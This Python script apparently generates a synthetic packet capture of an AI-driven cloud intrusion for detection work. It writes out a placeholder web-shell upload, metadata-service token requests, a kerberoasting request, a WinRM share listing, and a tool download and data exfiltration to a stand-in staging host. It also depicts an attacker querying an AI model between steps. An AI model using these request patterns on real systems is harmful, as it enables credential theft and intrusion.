#!/usr/bin/env python3
"""Generate a synthetic capture of an ARTEX-style, AI-driven intrusion.

No public capture of an ARTEX attack exists, so this one is built from the behaviour
that public reporting (Unit 42, Zscaler, Check Point, the FBI, November 2026) describes:
machine-speed recon that starts from machine-readable API maps, the same attack sequence
replayed about 30 seconds later, a "recheck loop" that polls every 48 seconds, a custom
web shell, cloud credential collection from the instance metadata service, Azure storage
access, Active Directory recon and kerberoasting, lateral movement and staged exfiltration.
Every address, name, token and file is invented, and the files carry no runnable code.

Network (an Azure virtual network, 10.20.0.0/24; Azure DNS 168.63.129.16)
  10.20.0.10  WEB01, public web app (the way in)   10.20.0.5   DC01, domain controller
  10.20.0.12  FS01, file server                     10.20.0.21  staff workstation
  10.20.0.30  SQL01                                 169.254.169.254  instance metadata service
  openrouter.ai  AI model API, called by an agent relay on WEB01 (an assumption of this scenario)
  203.0.113.45   ARTEX operator host (recon, exploitation, recheck loop)
  198.51.100.77  staging server (tool download, exfiltration)
"""
import random, struct, datetime, sys
from scapy.all import (Ether, IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, DNSRR, Raw, NTPHeader, wrpcap, conf)

conf.verb = 0
random.seed(4801)
T0 = datetime.datetime(2026, 11, 19, 2, 14, 0, tzinfo=datetime.timezone.utc).timestamp()
pkts = []

GW_MAC = '12:34:56:78:9a:bc'
MACS = {
    '10.20.0.1': GW_MAC, '10.20.0.5': '00:0d:3a:5c:00:05', '10.20.0.10': '00:0d:3a:5c:00:10',
    '10.20.0.12': '00:0d:3a:5c:00:12', '10.20.0.21': '00:0d:3a:5c:00:21', '10.20.0.30': '00:0d:3a:5c:00:30',
}
BCAST = 'ff:ff:ff:ff:ff:ff'

def mac(ip):
    return MACS.get(ip, GW_MAC)

def ttl_for(ip):
    return 64 if ip.startswith('10.') else random.choice([52, 54, 57, 118])

def add(t, p):
    p.time = T0 + t
    pkts.append(p)

def ip_pkt(src, dst, l4):
    return Ether(src=mac(src) if src.startswith('10.') else GW_MAC,
                 dst=mac(dst) if dst.startswith('10.') else GW_MAC) / IP(src=src, dst=dst, ttl=ttl_for(src)) / l4

class TcpSess:
    def __init__(self, c, sv, sp, cp=None):
        self.c, self.sv, self.sp = c, sv, sp
        self.cp = cp or random.randint(40000, 60999)
        self.cs = random.randint(1, 2**31)
        self.ss = random.randint(1, 2**31)

    def send(self, t, from_client, flags, data=b''):
        if from_client:
            l4 = TCP(sport=self.cp, dport=self.sp, flags=flags, seq=self.cs,
                     ack=self.ss if 'A' in flags else 0, window=64240)
            p = ip_pkt(self.c, self.sv, l4)
        else:
            l4 = TCP(sport=self.sp, dport=self.cp, flags=flags, seq=self.ss,
                     ack=self.cs if 'A' in flags else 0, window=65160)
            p = ip_pkt(self.sv, self.c, l4)
        if data:
            p = p / Raw(load=data)
        add(t, p)
        inc = len(data) + (1 if ('S' in flags or 'F' in flags) else 0)
        if from_client: self.cs = (self.cs + inc) % 2**32
        else: self.ss = (self.ss + inc) % 2**32
        return t

    def open(self, t, rtt=0.02):
        self.send(t, True, 'S'); self.send(t + rtt / 2, False, 'SA'); self.send(t + rtt, True, 'A')
        return t + rtt

    def close(self, t, rtt=0.02):
        self.send(t, True, 'FA'); self.send(t + rtt / 2, False, 'FA'); self.send(t + rtt, True, 'A')
        return t + rtt

    def xfer(self, t, from_client, data, mss=1448, gap=0.0004):
        for i in range(0, len(data), mss):
            self.send(t, from_client, 'PA' if i + mss >= len(data) else 'A', data[i:i + mss])
            t += gap
        return t

# ---------------- TLS helpers ----------------
def tls_client_hello(sni, alpn=(b'h2', b'http/1.1')):
    exts = b''
    name = sni.encode()
    sni_body = struct.pack('!HBH', len(name) + 3, 0, len(name)) + name
    exts += struct.pack('!HH', 0x0000, len(sni_body)) + sni_body
    alpn_list = b''.join(bytes([len(a)]) + a for a in alpn)
    alpn_body = struct.pack('!H', len(alpn_list)) + alpn_list
    exts += struct.pack('!HH', 0x0010, len(alpn_body)) + alpn_body
    sv = b'\x04\x03\x04\x03\x03'
    exts += struct.pack('!HH', 0x002b, len(sv)) + sv
    exts += struct.pack('!HH', 0x000a, 8) + b'\x00\x06\x00\x1d\x00\x17\x00\x18'
    ks = b'\x00\x1d\x00\x20' + random.randbytes(32)
    exts += struct.pack('!HHH', 0x0033, len(ks) + 2, len(ks)) + ks
    suites = b'\x13\x01\x13\x02\x13\x03\xc0\x2b\xc0\x2f\xc0\x2c\xc0\x30\xcc\xa9\xcc\xa8'
    body = (b'\x03\x03' + random.randbytes(32) + b'\x20' + random.randbytes(32) +
            struct.pack('!H', len(suites)) + suites + b'\x01\x00' + struct.pack('!H', len(exts)) + exts)
    hs = b'\x01' + len(body).to_bytes(3, 'big') + body
    return b'\x16\x03\x01' + struct.pack('!H', len(hs)) + hs

def tls_server_hello():
    exts = struct.pack('!HHH', 0x002b, 2, 0x0304) + struct.pack('!HHHH', 0x0033, 36, 0x001d, 32) + random.randbytes(32)
    body = b'\x03\x03' + random.randbytes(32) + b'\x20' + random.randbytes(32) + b'\x13\x01\x00' + struct.pack('!H', len(exts)) + exts
    hs = b'\x02' + len(body).to_bytes(3, 'big') + body
    rec = b'\x16\x03\x03' + struct.pack('!H', len(hs)) + hs
    rec += b'\x14\x03\x03\x00\x01\x01'                              # ChangeCipherSpec
    enc = tls_app(2400)[5:]
    rec += b'\x17\x03\x03' + struct.pack('!H', len(enc)) + enc        # encrypted extensions/cert
    return rec

POOL = None
def tls_app(n, blocks=None):
    global POOL
    if POOL is None: POOL = [random.randbytes(1024) for _ in range(8)]
    blocks = blocks or POOL
    out = b''
    while n > 0:
        k = min(n, 16384)
        if blocks:
            payload = b''.join(random.choice(blocks) for _ in range(k // 1024 + 1))[:k]
        else:
            payload = random.randbytes(k)
        out += b'\x17\x03\x03' + struct.pack('!H', k) + payload
        n -= k
    return out

def https(t, client, server, sni, up=600, down=20000):
    s = TcpSess(client, server, 443)
    t = s.open(t)
    s.send(t + 0.001, True, 'PA', tls_client_hello(sni))
    t = s.xfer(t + 0.03, False, tls_server_hello())
    s.send(t + 0.002, True, 'PA', b'\x14\x03\x03\x00\x01\x01' + tls_app(80))
    t = s.xfer(t + 0.01, True, tls_app(up))
    t = s.xfer(t + 0.04, False, tls_app(down))
    s.send(t + 0.002, True, 'A')
    return s.close(t + random.uniform(0.2, 1.5))

# ---------------- DNS ----------------
def dns(t, client, name, ips, qtype='A', server='168.63.129.16', rcode=0, txt=None):
    qid = random.randint(0, 65535)
    sport = random.randint(49152, 65535)
    add(t, ip_pkt(client, server, UDP(sport=sport, dport=53) / DNS(id=qid, rd=1, qd=DNSQR(qname=name, qtype=qtype))))
    if txt is not None:
        an = DNSRR(rrname=name, type='TXT', ttl=0, rdata=txt)
    else:
        an = None
        for ip in ips:
            rr = DNSRR(rrname=name, type='A', ttl=300, rdata=ip)
            an = rr if an is None else an / rr
    resp = DNS(id=qid, qr=1, aa=0, rd=1, ra=1, rcode=rcode, qd=DNSQR(qname=name, qtype=qtype), an=an)
    add(t + random.uniform(0.004, 0.03), ip_pkt(server, client, UDP(sport=53, dport=sport) / resp))

def http(t, client, server, req, resp, port=80, sess=None, close=True):
    s = sess or TcpSess(client, server, port)
    if sess is None:
        t = s.open(t)
    t = s.xfer(t + 0.001, True, req)
    t = s.xfer(t + random.uniform(0.01, 0.06), False, resp)
    s.send(t + 0.001, True, 'A')
    if close:
        t = s.close(t + 0.01)
    return t, s

def http_resp(code, reason, body=b'', ctype='text/html', server=b'Microsoft-IIS/10.0'):
    if isinstance(body, str): body = body.encode()
    return (b'HTTP/1.1 %d %s\r\nDate: Thu, 19 Nov 2026 02:14:00 GMT\r\nServer: %s\r\nContent-Type: %s\r\n'
            b'Content-Length: %d\r\n\r\n' % (code, reason.encode(), server, ctype.encode(), len(body))) + body

def http_req(method, path, host, ua, extra=b'', body=b''):
    if isinstance(body, str): body = body.encode()
    r = b'%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n' % (method.encode(), path.encode(), host.encode(), ua.encode())
    r += extra
    if body:
        r += b'Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n' % len(body)
    return r + b'\r\n' + body


UA = 'python-httpx/0.28.1'
BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'
WEB, DC, FS, WS, SQL = '10.20.0.10', '10.20.0.5', '10.20.0.12', '10.20.0.21', '10.20.0.30'
ATK, STAGE, IMDS = '203.0.113.45', '198.51.100.77', '169.254.169.254'
HOST = 'portal.northwind-demo.com'
END = 600.0

def fake_pe(note):
    # A harmless stand-in: only the MZ/PE header shape and DOS stub text, no runnable code.
    b = bytearray(6144); b[0:2] = b'MZ'; b[0x3c:0x40] = (0x80).to_bytes(4, 'little')
    stub = b'This program cannot be run in DOS mode.\r\r\n$'; b[0x4e:0x4e + len(stub)] = stub
    b[0x80:0x84] = b'PE\x00\x00'; b[0x84:0x86] = (0x14c).to_bytes(2, 'little')
    b[0x200:0x200 + len(note)] = note
    return bytes(b)

def j(o):
    import json
    return json.dumps(o, separators=(',', ':')).encode()

# =====================================================================
# Background: an ordinary morning on the network (0..600 s)
# =====================================================================
def arp_resolve(t, who, target):
    add(t, Ether(src=mac(who), dst=BCAST) / ARP(op=1, hwsrc=mac(who), psrc=who, pdst=target))
    add(t + 0.0008, Ether(src=mac(target), dst=mac(who)) / ARP(op=2, hwsrc=mac(target), psrc=target, hwdst=mac(who), pdst=who))

arp_resolve(0.2, WS, '10.20.0.1')
arp_resolve(0.6, WEB, '10.20.0.1')
for t in range(0, int(END), 64):
    add(t + 3.0, ip_pkt(WS, '20.101.57.9', UDP(sport=123, dport=123) / NTPHeader(mode=3)))
    add(t + 3.03, ip_pkt('20.101.57.9', WS, UDP(sport=123, dport=123) / NTPHeader(mode=4, stratum=2)))
SITES = [('teams.microsoft.com', '52.113.194.132'), ('outlook.office365.com', '52.97.146.162'), ('login.microsoftonline.com', '20.190.151.7'),
         ('www.bing.com', '204.79.197.200'), ('graph.microsoft.com', '20.190.152.20'), ('github.com', '140.82.112.3')]
t = 1.0
while t < END - 5:
    name, ip = random.choice(SITES)
    dns(t, WS, name, [ip])
    https(t + 0.05, WS, ip, name, up=random.randint(400, 2500), down=random.randint(4000, 60000))
    t += random.uniform(6, 16)
# the workstation logs on to the domain now and then: LDAP ping and Kerberos to the DC
for t in (5.0, 190.0, 410.0):
    dns(t, WS, '_ldap._tcp.dc._msdcs.corp.local', ['10.20.0.5'], server=DC)
    s = TcpSess(WS, DC, 88); tt = s.open(t + 0.1)
    tt = s.xfer(tt, True, b'\x00\x00\x01\x10' + b'\x6a\x82\x01\x0c' + b'AS-REQ krbtgt/CORP.LOCAL alice' + random.randbytes(230)); tt = s.xfer(tt + 0.01, False, b'\x00\x00\x02\x00' + random.randbytes(508)); s.close(tt + 0.02)
# normal visitors to the public web app
for t in range(12, int(END), 37):
    c = '%d.%d.%d.%d' % (random.choice([81, 92, 109, 151, 176]), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
    page = random.choice(['/', '/products', '/about', '/contact', '/css/site.css'])
    http(t + random.uniform(0, 5), c, WEB, http_req('GET', page, HOST, BROWSER_UA), http_resp(200, 'OK', '<html><body>Northwind demo portal</body></html>'))

# =====================================================================
# The intrusion
# =====================================================================
def probe(t, path, code=404, method='GET', body=b'', resp_body=None, ctype='text/html', sess=None):
    rb = resp_body if resp_body is not None else ('<html><body>%d</body></html>' % code)
    return http(t, ATK, WEB, http_req(method, path, HOST, UA, b'Accept-Encoding: gzip, deflate\r\n', body), http_resp(code, {200: 'OK', 401: 'Unauthorized', 403: 'Forbidden', 404: 'Not Found'}[code], rb, ctype), sess=sess)[0]

OPENAPI = j({'openapi': '3.0.1', 'info': {'title': 'Northwind Portal API', 'version': 'v1'}, 'paths': {
    '/api/v1/files/upload': {'post': {'summary': 'Upload an attachment', 'security': []}},
    '/api/v1/users/{id}': {'get': {}}, '/api/v1/orders': {'get': {}}, '/api/v1/admin/export': {'post': {}}}})

def attack_run(t0):
    """One ARTEX run: read the API map, scan, fuzz, upload a web shell and drive it. Replayed identically."""
    t = t0
    # T1595: machine-readable maps first, at machine speed
    for path, code, body, ct in [('/robots.txt', 200, 'User-agent: *\nDisallow: /api/\nDisallow: /uploads/\n', 'text/plain'),
                                 ('/.well-known/security.txt', 404, None, 'text/html'),
                                 ('/swagger/v1/swagger.json', 200, OPENAPI, 'application/json'),
                                 ('/openapi.json', 404, None, 'text/html'), ('/api/v1/health', 200, '{"status":"ok"}', 'application/json')]:
        t = probe(t, path, code, resp_body=body, ctype=ct) + 0.25
    # T1046: SYN scan of the web server's likely ports, in about a second
    for port in [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 1433, 1521, 2375, 3306, 3389, 5432, 5985, 5986, 6379, 8000, 8080, 8443, 9000, 9200, 27017]:
        sp = random.randint(40000, 60000)
        add(t, ip_pkt(ATK, WEB, TCP(sport=sp, dport=port, flags='S', seq=random.randint(1, 2**31), window=1024)))
        if port in (80, 443, 3389):
            add(t + 0.03, ip_pkt(WEB, ATK, TCP(sport=port, dport=sp, flags='SA', seq=random.randint(1, 2**31), ack=1, window=65535)))
        else:
            add(t + 0.03, ip_pkt(WEB, ATK, TCP(sport=port, dport=sp, flags='RA', seq=0, ack=1, window=0)))
        t += 0.035
    # T1595.003: endpoint fuzzing at a constant 120 ms
    for w in ['admin', 'backup', 'config', '.env', '.git/config', 'web.config', 'api/v1/admin', 'api/v1/debug', 'uploads', 'uploads/test.txt',
              'server-status', 'phpinfo.php', 'elmah.axd', 'trace.axd', 'api/v2', 'graphql', 'actuator/env', 'console', 'install', 'setup',
              'db', 'logs', 'tmp', 'old', 'dev', 'staging', 'export', 'download', 'internal', 'api/internal']:
        t = probe(t, '/' + w, 403 if w in ('uploads', 'admin') else 404) + 0.12
    # T1190: the upload endpoint takes any file; ARTEX drops a small ASPX web shell
    shell = (b'<%@ Page Language="C#" %>\r\n<%-- ARTEX demo web shell: synthetic, does nothing --%>\r\n'
             b'<% var c = Request["cmd"]; Response.Write("[demo] would run: " + c); %>\r\n')
    bnd = b'----artex' + b'7d1f'
    body = (b'--' + bnd + b'\r\nContent-Disposition: form-data; name="file"; filename="img.aspx"\r\nContent-Type: image/png\r\n\r\n' + shell + b'\r\n--' + bnd + b'--\r\n')
    req = (b'POST /api/v1/files/upload HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=%s\r\nContent-Length: %d\r\n\r\n'
           % (HOST.encode(), UA.encode(), bnd, len(body))) + body
    t = http(t + 0.2, ATK, WEB, req, http_resp(201, 'Created', j({'id': 4417, 'path': '/uploads/img.aspx'}), 'application/json'))[0] + 0.3
    # T1505.003 / T1059: drive the web shell
    for cmd, out in [('whoami', 'iis apppool\\northwind'), ('hostname', 'WEB01'), ('ipconfig', 'IPv4 Address. . . : 10.20.0.10'),
                     ('whoami /priv', 'SeImpersonatePrivilege  Enabled'), ('nltest /dclist:corp.local', 'DC01.corp.local [PDC] [DS] Site: Default-First-Site-Name')]:
        q = cmd.replace(' ', '+').replace('/', '%2F').replace(':', '%3A')
        t = probe(t, '/uploads/img.aspx?cmd=' + q, 200, resp_body='[demo] ' + out) + 0.4
    return t

t = attack_run(20.0)
t = attack_run(50.3)          # replayed identically about 30 s later

# T1555 / T1552.005: cloud credentials from the instance metadata service, through the shell
for path, out in [('/metadata/instance?api-version=2021-02-01', j({'compute': {'name': 'WEB01', 'subscriptionId': '00000000-demo-0000-0000-000000000000', 'resourceGroupName': 'rg-northwind-prod'}})),
                  ('/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', j({'access_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.DEMO-NOT-A-REAL-TOKEN.', 'expires_in': '86399', 'resource': 'https://management.azure.com/', 'token_type': 'Bearer'})),
                  ('/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/', j({'access_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.DEMO-STORAGE-TOKEN.', 'expires_in': '86399', 'resource': 'https://storage.azure.com/', 'token_type': 'Bearer'}))]:
    s = TcpSess(WEB, IMDS, 80)
    tt = s.open(t + 1.0, rtt=0.002)
    t = http(tt, WEB, IMDS, http_req('GET', path, IMDS, 'azsdk-python-identity/1.19.0', b'Metadata: true\r\n'), http_resp(200, 'OK', out, 'application/json', b'IMDS/150.870.65.1544'), sess=s)[0]
# Azure management (listKeys) and the storage account, over TLS
dns(t + 0.5, WEB, 'management.azure.com', ['4.150.240.10'])
t = https(t + 0.6, WEB, '4.150.240.10', 'management.azure.com', up=2100, down=3800)
dns(t + 0.4, WEB, 'nwprodbackups.blob.core.windows.net', ['20.60.132.4'])
t = https(t + 0.5, WEB, '20.60.132.4', 'nwprodbackups.blob.core.windows.net', up=1800, down=900_000)

# T1105: tool download from the staging server
dns(t + 2.0, WEB, 'files-cdn-sync.net', [STAGE])
t = http(t + 2.2, WEB, STAGE, http_req('GET', '/t/sharpagent.exe', 'files-cdn-sync.net', 'Microsoft-CryptoAPI/10.0'),
         http_resp(200, 'OK', fake_pe(b'ARTEX demo agent - harmless placeholder, not a program'), 'application/octet-stream', b'nginx'))[0]

# An AI-written helper script, fetched from the staging server. A harmless stand-in: it only prints
# messages, but it carries the marks an AI assistant leaves (chat preamble, credit line, emoji, steps).
ps1 = """# Sure! Here's a PowerShell script that collects the domain details you asked for.
# Generated with AI assistance (ARTEX demo, synthetic: this script performs no actions)
# Step 1: Check the environment
Write-Host "\u2705 [demo] environment check skipped"
# Step 2: Enumerate the domain
Write-Host "\u2705 [demo] domain enumeration skipped"
# Step 3: Package the results
Write-Host "\u2705 [demo] packaging skipped"
# Step 4: Upload to YOUR_STAGING_SERVER (replace with your server)
Write-Host "\U0001F680 [demo] upload skipped"
""".encode('utf-8')
t = http(t + 0.6, WEB, STAGE, http_req('GET', '/t/collect.ps1', 'files-cdn-sync.net', 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.20348.2849'),
         http_resp(200, 'OK', ps1, 'text/plain; charset=utf-8', b'nginx'))[0]

# T1087.002 / T1069: Active Directory recon over LDAP from the web server
def ber(tag, body): 
    n = len(body)
    return bytes([tag]) + (bytes([n]) if n < 128 else b'\x82' + struct.pack('!H', n)) + body
def ldap_search(mid, base, flt, attrs):
    req = ber(0x04, base.encode()) + b'\x0a\x01\x02\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00' + ber(0x87, flt.encode()) + ber(0x30, b''.join(ber(0x04, a.encode()) for a in attrs))
    return ber(0x30, b'\x02\x01' + bytes([mid]) + ber(0x63, req))
dns(t + 3.0, WEB, '_ldap._tcp.corp.local', [DC], server=DC)
s = TcpSess(WEB, DC, 389); tt = s.open(t + 3.2, rtt=0.001)
bind = ber(0x30, b'\x02\x01\x01' + ber(0x60, b'\x02\x01\x03' + ber(0x04, b'svc_web@corp.local') + ber(0x80, b'Summer2026!')))
tt = s.xfer(tt + 0.01, True, bind); tt = s.xfer(tt + 0.01, False, ber(0x30, b'\x02\x01\x01' + ber(0x61, b'\x0a\x01\x00\x04\x00\x04\x00')))
for i, (flt, attrs) in enumerate([('objectClass', ['sAMAccountName', 'memberOf']), ('servicePrincipalName', ['servicePrincipalName', 'sAMAccountName']),
                                  ('adminCount', ['sAMAccountName']), ('ms-Mcs-AdmPwd', ['ms-Mcs-AdmPwd']), ('trustPartner', ['trustPartner'])]):
    tt = s.xfer(tt + 0.05, True, ldap_search(i + 2, 'DC=corp,DC=local', flt, attrs))
    tt = s.xfer(tt + 0.02, False, ber(0x30, b'\x02\x01' + bytes([i + 2]) + ber(0x64, ber(0x04, b'CN=svc_sql,OU=Service,DC=corp,DC=local') + random.randbytes(300))))
t = s.close(tt + 0.1, rtt=0.001)
# T1558.003: kerberoasting, one TGS-REQ per service account, asking for RC4 (etype 23)
def der(tag, body):
    n = len(body)
    return bytes([tag]) + (bytes([n]) if n < 128 else (b'\x81' + bytes([n]) if n < 256 else b'\x82' + struct.pack('!H', n))) + body
def ctx(n, body): return der(0xa0 + n, body)
def kint(v): return der(0x02, v.to_bytes(max(1, (v.bit_length() + 8) // 8), 'big'))
def gstr(x): return der(0x1b, x.encode())
def tgs_req(spn, realm='CORP.LOCAL'):
    svc, host = spn.split('/', 1)
    pad = bytes(b for b in random.randbytes(400) if b != 0x1b)[:220]
    body = der(0x30, ctx(0, der(0x03, b'\x00\x40\x81\x00\x10')) + ctx(2, gstr(realm)) +
               ctx(3, der(0x30, ctx(0, kint(2)) + ctx(1, der(0x30, gstr(svc) + gstr(host))))) +
               ctx(5, der(0x18, b'20370913024805Z')) + ctx(7, kint(random.randint(1, 2**31 - 1))) + ctx(8, der(0x30, kint(23))))
    req = der(0x6c, der(0x30, ctx(1, kint(5)) + ctx(2, kint(12)) + ctx(3, der(0x30, der(0x30, ctx(1, kint(1)) + ctx(2, der(0x04, pad))))) + ctx(4, body)))
    return struct.pack('!I', len(req)) + req
for spn in ['MSSQLSvc/sql01.corp.local:1433', 'HTTP/web01.corp.local', 'CIFS/fs01.corp.local', 'svc_backup/fs01.corp.local', 'MSSQLSvc/sql01.corp.local']:
    s = TcpSess(WEB, DC, 88); tt = s.open(t + 0.08, rtt=0.001)
    tt = s.xfer(tt, True, tgs_req(spn))
    tt = s.xfer(tt + 0.01, False, b'\x00\x00\x05\x00\x6d\x82\x04\xfc' + random.randbytes(1272))
    t = s.close(tt + 0.01, rtt=0.001)

# T1021 / T1046: internal sweep for SMB, RDP and WinRM from the web server, then lateral movement
t += 2.0
for host in range(1, 41):
    ip = '10.20.0.%d' % host
    if ip == WEB: continue
    for port in (445, 3389, 5985):
        sp = random.randint(49152, 65000)
        add(t, ip_pkt(WEB, ip, TCP(sport=sp, dport=port, flags='S', seq=random.randint(1, 2**31), window=64240)))
        if ip in (DC, FS, SQL, WS) and not (ip == WS and port == 5985):
            add(t + 0.0008, ip_pkt(ip, WEB, TCP(sport=port, dport=sp, flags='SA', seq=random.randint(1, 2**31), ack=1, window=65535)))
        elif ip in (DC, FS, SQL, WS):
            add(t + 0.0008, ip_pkt(ip, WEB, TCP(sport=port, dport=sp, flags='RA', seq=0, ack=1, window=0)))
        t += 0.006
# WinRM to the file server with the stolen service account
s = TcpSess(WEB, FS, 5985); tt = s.open(t + 1.0, rtt=0.001)
wsman = (b'<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">'
         b'<rsp:Command>cmd /c dir \\\\fs01\\finance$ /s</rsp:Command></rsp:CommandLine></s:Body></s:Envelope>')
req = (b'POST /wsman HTTP/1.1\r\nHost: fs01.corp.local:5985\r\nUser-Agent: Ruby WinRM Client (2.8.3)\r\nAuthorization: Negotiate TlRMTVNTUAADAAAA\r\nContent-Type: application/soap+xml;charset=UTF-8\r\nContent-Length: %d\r\n\r\n' % len(wsman)) + wsman
t = http(tt, WEB, FS, req, http_resp(200, 'OK', b'<s:Envelope><s:Body>[demo] 214 File(s) 1,982,331,004 bytes</s:Body></s:Envelope>', 'application/soap+xml', b'Microsoft-HTTPAPI/2.0'), port=5985, sess=s)[0]
# SMB pulls from the finance share
s = TcpSess(WEB, FS, 445); tt = s.open(t + 0.5, rtt=0.001)
tt = s.xfer(tt, True, b'\x00\x00\x00\x6c\xfeSMB@\x00' + random.randbytes(100))
tt = s.xfer(tt + 0.002, False, b'\x00\x00\x01\x00\xfeSMB@\x00' + random.randbytes(252))
tt = s.xfer(tt + 0.01, True, b'\x00\x00\x00\x90\xfeSMB@\x00\x00\x00\x00\x00\x03\x00' + '\\\\fs01\\finance$'.encode('utf-16le') + random.randbytes(80))
tt = s.xfer(tt + 0.01, False, b'\xfeSMB' + random.randbytes(700_000), gap=0.0001)
t = s.close(tt + 0.05, rtt=0.001)

# T1560 / T1041: staged exfiltration to the staging server over TLS
dns(t + 4.0, WEB, 'sync.files-cdn-sync.net', [STAGE])
blocks = [random.randbytes(1024) for _ in range(6)]
ex = TcpSess(WEB, STAGE, 443)
tt = ex.open(t + 4.2, rtt=0.08)
ex.send(tt + 0.001, True, 'PA', tls_client_hello('sync.files-cdn-sync.net'))
tt = ex.xfer(tt + 0.09, False, tls_server_hello())
tt = ex.xfer(tt + 0.01, True, tls_app(1_600_000, blocks), gap=0.0018)
ex.close(tt + 0.1, rtt=0.08)

# An agent relay on the foothold asks an AI model what to do next between steps
# (an assumption of this scenario: public reports describe ARTEX handing off to AI coding assistants)
dns(66.0, WEB, 'openrouter.ai', ['104.18.2.115'])
for tt in (66.2, 79.5, 93.0, 104.0, 121.0, 139.5):
    https(tt, WEB, '104.18.2.115', 'openrouter.ai', up=random.randint(5000, 14000), down=random.randint(1500, 6000))

# The recheck loop: ARTEX polls its web shell every 48 seconds for the rest of the capture
t = 110.0
while t < END - 2:
    probe(t + random.uniform(-0.04, 0.04), '/uploads/img.aspx?cmd=echo+alive', 200, resp_body='[demo] alive')
    t += 48.0

pkts.sort(key=lambda p: p.time)
out = sys.argv[1] if len(sys.argv) > 1 else str(__import__('pathlib').Path(__file__).resolve().parent.parent / 'samples' / 'artex_ai_attack.pcap')
wrpcap(out, pkts)
print('wrote', out, len(pkts), 'packets')
